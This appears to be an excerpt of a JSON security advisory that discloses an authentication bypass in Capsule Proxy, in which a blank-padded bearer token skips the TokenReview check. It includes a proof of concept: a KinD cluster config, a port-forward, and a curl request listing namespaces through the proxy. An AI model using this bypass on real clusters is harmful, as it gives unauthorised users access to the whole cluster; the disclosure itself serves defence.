  "summary": "Capsule Proxy Authentication bypass using an empty token",
  "details": "The privilege escalation is based on a missing check if the user is authenticated based on the `TokenReview` result.\n\nAll the clusters running with the `anonymous-auth` Kubernetes API Server setting disable (set to `false`) are affected since it would be possible to bypass the token review mechanism, interacting with the upper Kubernetes API Server.\n\n# PoC\n\nStart a KinD cluster with the `anonymous-auth` value to `false`. \nIf it is true, it uses anonymous permissions which are very limited by default\n\n```yaml\nkind: Cluster\napiVersion: kind.x-k8s.io/v1alpha4\nnodes:\n- role: control-plane\n  kubeadmConfigPatches:\n  - |\n    kind: ClusterConfiguration\n    apiServer:\n        extraArgs:\n          anonymous-auth: \"false\"\n```\n\nInstall `capsule` and `capsule-proxy`\n\n```\nk port-forward svc/capsule-proxy 9001    \nForwarding from 127.0.0.1:9001 -\u003e 9001\nForwarding from [::1]:9001 -\u003e 9001\nHandling connection for 9001\n```\n\nThen query the proxy\n```\ncurl -g -k -H 'Authorization: Bearer   f' -X 'GET' 'https://localhost:9001/api/v1/namespaces'\n```\n\n# Impact\n\nThe whole cluster is exposed to unauthorised users.\n\nThis privilege escalation cannot be exploited if you're relying only on client certificates (SSL/TLS).",
